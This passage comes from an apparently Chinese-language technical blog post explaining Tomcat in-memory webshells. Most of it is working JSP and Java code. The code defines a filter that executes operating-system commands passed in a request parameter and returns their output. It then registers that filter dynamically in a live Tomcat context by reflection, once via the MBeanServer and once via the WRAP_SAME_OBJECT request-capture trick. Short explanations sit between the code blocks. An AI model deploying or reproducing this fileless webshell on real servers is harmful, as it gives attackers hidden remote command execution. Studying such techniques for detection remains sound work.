class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> REInject</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * webshell命令参数名</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                             FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String filterName = <span class="string">"TomcatFilterShell"</span>;</span><br><span class="line">    <span class="keyword">final</span> String filterUrlPattern = <span class="string">"/xxxxxxx/*"</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">        MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br><span class="line"><span class="comment">// 获取mbsInterceptor</span></span><br><span class="line">        Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object mbsInterceptor = field.get(mBeanServer);</span><br><span class="line"><span class="comment">// 获取repository</span></span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object repository = field.get(mbsInterceptor);</span><br><span class="line"><span class="comment">// 获取domainTb</span></span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap&lt;String, Map&lt;String, NamedObject&gt;&gt; domainTb = (HashMap&lt;String,Map&lt;String,NamedObject&gt;&gt;)field.get(repository);</span><br><span class="line"><span class="comment">// 获取domain</span></span><br><span class="line">        NamedObject nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/,host=localhost,name=NonLoginAuthenticator,type=Valve"</span>);</span><br><span class="line">        out.println(<span class="string">"Inject /,please visit /xxxxxxx/aaaa?sectest666=whoami"</span>);</span><br><span class="line">        <span class="keyword">if</span>(nonLoginAuthenticator==<span class="keyword">null</span>)&#123;</span><br><span class="line">            nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/manager,host=localhost,name=BasicAuthenticator,type=Valve"</span>);</span><br><span class="line">        out.println(<span class="string">"Inject /,please visit /manager/xxxxxxx/aaaa?sectest666=whoami"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object object = field.get(nonLoginAuthenticator);</span><br><span class="line"><span class="comment">// 获取resource</span></span><br><span class="line">        field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object resource = field.get(object);</span><br><span class="line"><span class="comment">// 获取context</span></span><br><span class="line">        field = Class.forName(<span class="string">"org.apache.catalina.authenticator.AuthenticatorBase"</span>).getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        StandardContext context = (StandardContext) field.get(resource);</span><br><span class="line">        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                .getDeclaredField("state");</span><br><span class="line">        stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        stateField.set(context, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">        ApplicationContext appContext=<span class="keyword">new</span> ApplicationContext(context);</span><br><span class="line">        <span class="keyword">if</span> (appContext.getFilterRegistration(filterName) == <span class="keyword">null</span> &amp;&amp; context != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Filter tomcatShellFilter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">            javax.servlet.FilterRegistration.Dynamic filterRegistration = appContext</span><br><span class="line">                    .addFilter(filterName, tomcatShellFilter);</span><br><span class="line">            filterRegistration.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">            filterRegistration.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">            filterRegistration</span><br><span class="line">                    .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,</span><br><span class="line">                            <span class="keyword">new</span> String[]&#123;filterUrlPattern&#125;);</span><br><span class="line">            Method filterStartMethod = org.apache.catalina.core.StandardContext<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                    .getMethod("filterStart");</span><br><span class="line">            filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            filterStartMethod.invoke(context, <span class="keyword">null</span>);</span><br><span class="line">            Class ccc = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ccc = Class.forName(<span class="string">"org.apache.tomcat.util.descriptor.web.FilterMap"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">            <span class="keyword">if</span> (ccc == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ccc = Class.forName(<span class="string">"org.apache.catalina.deploy.FilterMap"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//把filter插到第一位</span></span><br><span class="line">            Class c = Class.forName(<span class="string">"org.apache.catalina.core.StandardContext"</span>);</span><br><span class="line">            Method m = c.getMethod(<span class="string">"findFilterMaps"</span>);</span><br><span class="line">            Object[] filterMaps = (Object[]) m.invoke(context);</span><br><span class="line">            Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length];</span><br><span class="line">            <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                Object o = filterMaps[i];</span><br><span class="line">                m = ccc.getMethod(<span class="string">"getFilterName"</span>);</span><br><span class="line">                String name = (String) m.invoke(o);</span><br><span class="line">                <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                    tmpFilterMaps[<span class="number">0</span>] = o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    tmpFilterMaps[index++] = filterMaps[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stateField.set(context, org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException | InvocationTargetException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException | NoSuchMethodException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h5 id="修改WRAP-SAME-OBJECT从request对象中获取"><a href="#修改WRAP-SAME-OBJECT从request对象中获取" class="headerlink" title="修改WRAP_SAME_OBJECT从request对象中获取"></a>修改WRAP_SAME_OBJECT从request对象中获取</h5><p>​        之前在介绍tomcat回显方案时介绍过可以通过修改WRAP_SAME_OBJECT的内容为true获取到request和response对象。获取到request对象后可通过<code>request.getServletContext()</code>获取到servletContext。获取servletContext的代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//获取各字段</span></span><br><span class="line">    java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">    Class applicationFilterChain = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">    java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">    java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//去掉final修饰符</span></span><br><span class="line">    java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");</span><br><span class="line">    modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">    modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">    modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置允许访问</span></span><br><span class="line">    WRAP_SAME_OBJECT.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    lastServicedRequest.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    lastServicedResponse.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">    <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="keyword">null</span>))&#123;</span><br><span class="line">        WRAP_SAME_OBJECT.setBoolean(<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">        lastServicedRequest.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">        lastServicedResponse.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="keyword">null</span>);</span><br><span class="line">        javax.servlet.ServletRequest request = threadLocalRequest.get();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        由于动态注册Filter需要修改standardContext的state属性，因此我们需要standardContext对象，此处的servletContext实际上时ApplicationContextFacade对象，通过servletContext可以获取到StandardContext对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext); <span class="comment">//获取servletContext对象</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext); <span class="comment">//获取standardContext对象</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201229115530952.png" alt="image-20201229115530952"></p>
<p>​        后面的实现和MBeanServer类似，直接给出JSP文件。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;servletContext&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> REInject</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * webshell命令参数名</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"sectest666"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                             FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd;</span><br><span class="line">            <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> String filterName = <span class="string">"TomcatFilterShell"</span>;</span><br><span class="line">    <span class="keyword">final</span> String filterUrlPattern = <span class="string">"/xxxxxxx/*"</span>;</span><br><span class="line">          <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取各字段</span></span><br><span class="line">            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">            Class applicationFilterChain = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationFilterChain"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedRequest"</span>);</span><br><span class="line">            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField(<span class="string">"lastServicedResponse"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去掉final修饰符</span></span><br><span class="line">            java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");</span><br><span class="line">            modifiers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置允许访问</span></span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="keyword">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="keyword">null</span>,<span class="keyword">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                lastServicedResponse.set(<span class="keyword">null</span>,<span class="keyword">new</span> ThreadLocal());</span><br><span class="line">                out.println(<span class="string">"WRAP_SAME_OBJECT change success!please try again for Inject Filter"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="keyword">null</span>);</span><br><span class="line">                javax.servlet.ServletRequest request1 = threadLocalRequest.get();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//获取servletContext</span></span><br><span class="line">                    javax.servlet.ServletContext servletContext=request1.getServletContext();</span><br><span class="line">                    <span class="comment">//获取applicationContext</span></span><br><span class="line">                    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line">                    <span class="comment">//获取standardContext</span></span><br><span class="line">                    contextField=applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">                    contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line">                    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                            .getDeclaredField("state");</span><br><span class="line">                    stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line">                    <span class="keyword">if</span> (applicationContext.getFilterRegistration(filterName) == <span class="keyword">null</span> &amp;&amp; standardContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        Filter tomcatShellFilter = <span class="keyword">new</span> TomcatShellFilter();</span><br><span class="line">                        javax.servlet.FilterRegistration.Dynamic filterRegistration = applicationContext</span><br><span class="line">                                .addFilter(filterName, tomcatShellFilter);</span><br><span class="line">                        filterRegistration.setInitParameter(<span class="string">"encoding"</span>, <span class="string">"utf-8"</span>);</span><br><span class="line">                        filterRegistration.setAsyncSupported(<span class="keyword">false</span>);</span><br><span class="line">                        filterRegistration</span><br><span class="line">                                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="keyword">false</span>,</span><br><span class="line">                                        <span class="keyword">new</span> String[]&#123;filterUrlPattern&#125;);</span><br><span class="line">                        </span><br><span class="line">                        Method filterStartMethod = org.apache.catalina.core.StandardContext<span class="class">.<span class="keyword">class</span></span></span><br><span class="line">                                .getMethod("filterStart");</span><br><span class="line">                        